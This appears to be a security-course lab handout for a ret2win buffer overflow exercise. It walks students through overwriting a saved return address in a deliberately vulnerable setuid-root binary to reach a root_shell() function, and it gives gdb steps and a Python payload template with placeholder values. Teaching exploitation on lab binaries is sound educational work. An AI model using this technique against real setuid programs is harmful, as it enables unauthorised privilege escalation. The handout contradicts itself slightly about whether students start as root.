# Level 3 — "Root Shell" (Hard)

Level 2 injected code on the stack. Level 3 is cleaner and more modern:
you never put code on the stack. You overwrite the **saved return address**
with the address of an existing function, `root_shell()`, which runs
`system("/bin/sh")`.

**Win condition:** you get a shell where `id` shows `uid=0(root)`, after seeing

```text
*** ACCESS GRANTED :: SPAWNING ROOT SHELL ***
*** LEVEL 3 CLEARED ***
```

Before the attack, `id` should show your normal student user — not root.
On the course VM this binary is **setuid-root**; that is why jumping to
`root_shell()` can escalate. Logging into the VM does **not** make you root.

You do **not** edit `vulnerable.c`. You craft the input payload.

---

## Idea

```text
buffer[64] | saved EBP / padding | saved return address
                                  overwrite this ----------^
                                  with &root_shell
```

When `vulnerable()` returns, the CPU jumps to `root_shell()` instead of back
to `main`.

---

## Step 1 — Build

```bash
make
file vulnerable      # ELF 32-bit ... Intel 80386
```

**Read the compiler warnings.** Level 3 does **not** use `-z execstack`
(you jump to existing code, not code on the stack).

## Step 2 — Find `root_shell`

```bash
nm vulnerable | grep root_shell
# or
gdb -q -batch -ex "info address root_shell" ./vulnerable
```

## Step 3 — Find the offset

With `buffer[64]` plus frame/alignment padding, the offset is often a bit
above `64 + 4`. **Measure on your VM:**

```bash
gdb ./vulnerable
(gdb) break vulnerable
(gdb) run
(gdb) print &buffer
(gdb) info frame
```

Or use a cyclic pattern and see what lands in EIP when it crashes.

## Step 4 — Fire the payload

```python
import sys
import struct

root = 0xREPLACE_ME   # from nm / gdb
offset = REPLACE_ME   # measured on YOUR vm

payload = b"A" * offset + struct.pack("<I", root)
sys.stdout.buffer.write(payload)
```

```bash
python3 solve.py | ./vulnerable
```

You should land in a shell. Try:

```bash
id
whoami
exit
```

On this lab VM you are often already root, so the shell is a root shell.
The lesson is **control-flow hijack**, not a magical privilege exploit.

## Step 5 — Submit

- Your payload / solve script
- The address of `root_shell` and the offset you used
- 4–6 sentences: how overwriting the return address transfers control, and
  how this differs from the Level 2 NOP-sled + shellcode approach

---

## What you should understand after this

- Control flow can be hijacked by overwriting a saved return address.
- **ret2win / return-to-function** reuses code already in the binary.
- This still works when the stack is **non-executable** (no shellcode needed).
- Real systems add more defenses (ASLR, canaries, PIE, …) because these
  attacks are exactly why those defenses exist.
